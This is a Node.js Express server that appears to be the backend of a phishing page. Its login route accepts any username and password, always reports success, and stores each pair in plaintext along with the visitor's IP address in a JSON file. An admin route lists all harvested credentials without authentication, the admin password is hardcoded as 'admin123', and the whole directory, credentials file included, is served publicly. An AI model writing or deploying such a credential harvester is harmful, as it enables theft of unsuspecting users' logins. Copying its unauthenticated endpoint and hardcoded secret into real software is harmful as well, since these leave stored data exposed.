const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(__dirname));

// Ensure admin directory and credentials file exist
const adminDir = path.join(__dirname, 'admin');
const credentialsFile = path.join(adminDir, 'credentials.json');

if (!fs.existsSync(adminDir)) {
  fs.mkdirSync(adminDir, { recursive: true });
}

if (!fs.existsSync(credentialsFile)) {
  fs.writeFileSync(credentialsFile, JSON.stringify([], null, 2));
}

// Route to handle login form submission
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ success: false, message: 'Username and password are required' });
  }

  // Read existing credentials
  let credentials = [];
  try {
    const data = fs.readFileSync(credentialsFile, 'utf8');
    credentials = JSON.parse(data);
  } catch (error) {
    credentials = [];
  }

  // Add new credential entry
  const newEntry = {
    id: credentials.length + 1,
    username: username,
    password: password,
    timestamp: new Date().toISOString(),
    ipAddress: req.ip || req.connection.remoteAddress
  };

  credentials.push(newEntry);

  // Save to file
  try {
    fs.writeFileSync(credentialsFile, JSON.stringify(credentials, null, 2));
    res.json({ success: true, message: 'Login successful' });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Error saving credentials' });
  }
});

// Route to get credentials (for admin panel)
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;

  // Simple password check (in production, use proper authentication)
  if (password === 'admin123') {
    res.json({ success: true, message: 'Admin authenticated' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid password' });
  }
});

// Route to fetch all credentials
app.get('/api/admin/credentials', (req, res) => {
  try {
    const data = fs.readFileSync(credentialsFile, 'utf8');
    const credentials = JSON.parse(data);
    res.json({ success: true, credentials: credentials });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Error reading credentials' });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
  console.log(`Admin panel: http://localhost:${PORT}/admin`);
});
